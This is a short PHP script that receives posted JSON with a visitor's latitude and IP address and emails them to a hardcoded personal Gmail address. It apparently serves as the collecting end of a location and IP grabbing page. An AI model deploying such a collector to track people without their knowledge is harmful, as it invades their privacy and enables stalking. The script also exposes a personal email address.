<?php
header("Content-Type: application/json");
$data = json_decode(file_get_contents("php://input"));

$loc = $data->loc;
$ip = $data->ip;

$to = "aslamrehan884@gmail.com"; // Replace with your Gmail address
$subject = "Geolocation Data";
$message = "Latitude: $loc, ip: $ip";
$headers = "From: aslamrehan884@gmail.com"; // Replace with your Gmail address

$success = mail($to, $subject, $message, $headers);

echo json_encode(["success" => $success]);
?>
